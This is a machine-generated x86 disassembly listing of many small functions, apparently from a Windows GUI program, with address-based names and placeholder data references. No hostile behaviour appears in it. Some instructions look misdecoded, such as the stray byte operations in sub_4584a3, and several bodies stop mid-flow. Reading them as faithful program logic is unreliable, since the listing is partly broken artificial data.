retn 0x4
sub_448d70
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_448d78
call sub_445824
retn
sub_448e78
jmp sub_4039ec
sub_449038
jmp sub_4039ec
sub_449088
jmp sub_4039ec
sub_4490c0
retn
sub_449349
jmp sub_4039ec
sub_4494d1
jmp sub_4039ec
sub_449833
jmp sub_4039ec
sub_4498df
jmp sub_4039ec
sub_4498ec
inc [ eax + 0x160 ]
retn
sub_4498f4
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_449914
sub_449914
xor edx edx
call sub_449858
retn
sub_4499e1
jmp sub_4039ec
sub_4499e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449ad7
jmp sub_4039ec
sub_449ffe
jmp sub_4039ec
sub_44a005
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a1cd
jmp sub_4039ec
sub_44a1d4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a2a8
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_44a495
jmp sub_4039ec
sub_44a49c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_44a58c
xor eax eax
retn
sub_44a5f4
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44790c
sub_44a722
jmp sub_403738
sub_44a857
jmp sub_4039ec
sub_44a85e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a868
jmp sub_403738
sub_44a86d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466fa8
call sub_403aa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ae28
jmp sub_4039ec
sub_44ae2f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ae38
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44b336
jmp sub_4039ec
sub_44b388
push ebx
mov ebx eax
call sub_422f6c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44790c
pop ebx
retn
sub_44b3a4
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44790c
retn
sub_44b3b8
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44790c
retn
sub_44b3c8
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44790c
retn
sub_44b674
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44d364
pop esi
retn
sub_44b788
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44b7d8
pop esi
retn
sub_44b79c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44b8c4
pop esi
retn
sub_44b7b0
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44b7c4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44b8b7
jmp sub_4039ec
sub_44b8be
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b94e
jmp sub_4039ec
sub_44b955
pop ebx
pop ecx
pop ebp
retn
sub_44b95c
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44b96c
retn
sub_44b970
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44b990
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_44baf0
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44bbc0
retn
sub_44bcd8
jmp sub_4039ec
sub_44bcdf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bdaa
jmp sub_4039ec
sub_44bdd4
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44be66
jmp sub_4039ec
sub_44c038
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44c2dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44c3b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_449de4
pop esi
retn
sub_44c47c
push esi
mov si 0xffc1
call sub_40346c
pop esi
retn
sub_44c4a8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44c4bc
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44c4d0
call sub_449da4
retn
sub_44c4d8
call sub_449da4
retn
sub_44c4e0
call sub_449da4
retn
sub_44c588
push ebx
mov ebx eax
mov eax ebx
call sub_448328
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_4240e4
mov dx 0xb009
mov eax ebx
call sub_449de4
pop ebx
retn
sub_44c6ec
call sub_449da4
retn
sub_44c6f4
call sub_449da4
retn
sub_44c6fc
call sub_449da4
retn
sub_44c704
call sub_449da4
retn
sub_44c768
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44cbfe
jmp sub_4039ec
sub_44cc05
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44cce4
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44ce88
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44790c
retn
sub_44cf28
push ebx
mov ebx eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_44cf44
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_44d11c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_44d054
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_44d174
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44790c
sub_44d194
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44790c
sub_44d1b8
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_44d1c4
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44790c
sub_44d270
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_44d214
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_44d34c
jmp sub_4039ec
sub_44d353
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d572
jmp sub_4039ec
sub_44d579
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44d680
call sub_4476dc
retn
sub_44dace
jmp sub_4039ec
sub_44db64
mov eax [ r-xdata ]
retn
sub_44dccb
jmp sub_4039ec
sub_44dddc
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44790c
sub_44ddfc
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44790c
sub_44e112
jmp sub_4039ec
sub_44e254
test [ eax + 0x52 ] 0x4
setne al
retn
sub_44e3b0
jmp sub_4039ec
sub_44e3b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424a18
retn
sub_44e3d3
jmp sub_4039ec
sub_44e3e0
retn
sub_44e4b4
mov [ edx + 0xc ] 0xffffffff
retn
sub_44e512
jmp sub_4039ec
sub_44e519
pop ecx
pop ecx
pop ebp
retn
sub_44e5b9
jmp sub_4039ec
sub_44e5c0
pop ebx
mov esp ebp
pop ebp
retn
sub_44e62c
call sub_44a5ac
retn
sub_44e6bf
jmp sub_4039ec
sub_44e6c6
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_44e8a5
jmp sub_4039ec
sub_44e8ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44eac8
jmp sub_4039ec
sub_44eb1c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_44ea08
sub_44ec60
push ebx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_44ec78
push ebx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_44ed64
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44b1e4
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_44edff
jmp sub_4039ec
sub_44ee06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee29
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424a18
retn
sub_44ee22
jmp sub_4039ec
sub_44ee29
pop ebx
pop ecx
pop ebp
retn
sub_44ee30
retn
sub_44ee98
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_44f205
jmp sub_4039ec
sub_44f3ec
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_44f5d8
jmp sub_4039ec
sub_44f688
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_44f69c
inc [ eax + 0x6c ]
retn
sub_44f6a0
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_450f20
sub_44f800
call sub_44ff00
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_4501ab
jmp sub_4039ec
sub_4501b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4501cf
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_4501c8
jmp sub_4039ec
sub_4501cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4504b0
jmp sub_4039ec
sub_4504b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4504d4
mov eax [ ebp - 0x4 ]
call sub_424a18
retn
sub_4504cd
jmp sub_4039ec
sub_4504d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4504f1
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_4504ea
jmp sub_4039ec
sub_4504f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4509a5
jmp sub_4039ec
sub_4509ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450b37
jmp sub_4039ec
sub_450b3e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450bf3
jmp sub_4039ec
sub_450bfa
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450ce8
jmp sub_4039ec
sub_450d39
jmp sub_4039ec
sub_450d40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450dfc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f70c
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_450f48
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_44f248
sub_451848
jmp sub_4039ec
sub_45184f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451918
call GetCapture
retn
sub_451920
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cad0
pop ebx
retn
sub_451930
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_451b96
jmp sub_4039ec
sub_451d90
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_451fa4
jmp sub_4039ec
sub_451fab
pop ebx
mov esp ebp
pop ebp
retn
sub_452057
jmp sub_4039ec
sub_45205e
pop ebp
retn
sub_4520e6
jmp sub_4039ec
sub_4520ed
pop ebp
retn
sub_452334
stc
push ebx
push eax
jmp eax
sub_45283c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4185ac
retn
sub_452854
mov al 0x1
retn
sub_452858
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_420c9c
retn
mov eax edx
retn
sub_452868
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_420c6c
retn
mov al 0x1
retn
sub_452b58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418550
pop esi
pop ebx
retn
sub_452b6c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_452ba8
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_452e0c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452e20
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452e34
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452e48
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452e5c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452e70
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452e84
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452e98
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452eac
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452ec0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop ebx
retn
sub_452ed4
retn
sub_452ed8
retn
sub_452edc
retn
sub_452ee0
retn
sub_452ee4
retn
sub_452ee8
retn
sub_452eec
retn
sub_452ef0
retn
sub_452ef4
retn
sub_452ef8
retn
sub_452efc
retn
sub_452f00
retn
sub_4531ac
jmp sub_4039ec
sub_453548
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x90 ] eax
sub_453570
push esi
mov si 0xffef
call sub_40346c
pop esi
retn
sub_453611
jmp sub_4039ec
sub_453618
pop ebp
retn
sub_45361c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
sub_4537bc
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_453941
jmp sub_4039ec
sub_453948
pop ebx
pop ecx
pop ebp
retn
sub_45394c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_453954
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_453b24
sub_453a01
jmp sub_4039ec
sub_453a08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403270
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_453bb7
jmp sub_4039ec
sub_453bbe
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453c56
jmp sub_4039ec
sub_453c5d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c7a
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub_453c73
jmp sub_4039ec
sub_453c7a
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40346c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453d33
jmp sub_4039ec
sub_453d3a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453d40
or edx 0xffffffff
call sub_453cb4
retn
sub_45414f
jmp sub_4039ec
sub_454156
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454173
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub_45416c
jmp sub_4039ec
sub_454173
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454190
mov eax [ ebp - 0x4 ]
call sub_454c88
retn
sub_454189
jmp sub_4039ec
sub_454190
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454394
jmp sub_4039ec
sub_45439b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4543a0
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_40346c
sub_4543b8
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_416eec
pop ebx
retn
sub_45445c
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4183f4
sub_454573
jmp sub_4039ec
sub_45457a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403270
retn
sub_454590
jmp sub_4039ec
sub_4548a2
jmp sub_4039ec
sub_4548a9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4548c6
mov eax [ ebp - 0x10 ]
call sub_403270
retn
sub_4548bf
jmp sub_4039ec
sub_4548c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4548e3
mov eax [ ebp - 0x8 ]
call sub_403270
retn
sub_4548dc
jmp sub_4039ec
sub_4548e3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45494c
jmp sub_4039ec
sub_454a65
jmp sub_4039ec
sub_454a82
jmp sub_4039ec
sub_454c3a
jmp sub_4039ec
sub_454c41
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454c84
inc [ eax + 0x5c ]
retn
sub_454c88
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_40346c
sub_454cdc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_454d19
jmp sub_4039ec
sub_454d20
pop ebp
retn
sub_454d24
sub [ rw-data ] 0x1
retn
sub_455c8c
mov eax [ esp + 0x8 ]
retn
sub_455c94
push ebx
mov ebx eax
call sub_455c8c
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
jmp sub_403a24
sub_455cb0
pop ebx
retn
sub_455f29
jmp sub_4039ec
sub_455f30
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45607b
jmp sub_4039ec
sub_456082
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456098
push ebx
mov eax [ rw-data ]
call sub_418aa8
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_418a7c
mov eax ebx
pop ebx
retn
sub_456220
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45623c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_456937
jmp sub_4039ec
sub_45693e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456a36
jmp sub_4039ec
sub_456a3d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456e60
jmp sub_4039ec
sub_456e67
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_457313
jmp sub_4039ec
sub_4577b4
jmp sub_4039ec
sub_4577bb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457c1f
jmp sub_4039ec
sub_4580dc
jmp sub_4039ec
sub_4580e3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45848e
jmp sub_4039ec
sub_458495
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4584a3
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_458650
mov eax [ r-xdata ]
retn
sub_45868c
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4586a0
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4586b0
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4586c0
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_4589bc
mov edx eax
sub_458758
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
mov edx esi
call sub_4586d8
pop esi
pop ebx
retn
sub_4587d4
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4589bc
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4185ac
mov ecx eax
sub_458bac
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_458c14
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_458fbc
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_458ff0
sub_458ff0
mov edx sub_458fc8
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_456118
retn
sub_4591da
jmp sub_4039ec
sub_4591e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459678
jmp sub_4039ec
sub_4596b7
jmp sub_4039ec
sub_4596be
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45985c
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_459998
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_40346c
pop esi
pop ebp
retn 0x8
sub_4599b4
mov eax [ eax + 0x34 ]
call sub_456bec
retn
sub_4599c0
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_40346c
pop esi
retn
sub_4599fc
push ebx
mov ecx sub_4599d4
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_456118
pop ebx
retn
sub_459c30
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_459c44
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_403738#8
jmp sub_403738
sub_459e7b
jmp sub_4039ec
sub_459ea6
jmp sub_4039ec
sub_459ead
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_459ec4
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45a0ac
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4599fc
sub_45a12c
jmp sub_4039ec
sub_45a170
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45a188
push ebx
mov ebx eax
mov eax ebx
call sub_420cbc
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45a1da
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4599fc
sub_45a250
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45a399
jmp sub_4039ec
sub_45a3a0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45a5e0
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45a5f0
sub_45a644
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_45a654
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_45a664
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_45a674
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_45a684
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_45a6fc
test edx edx
je r-xdata
xor edx edx
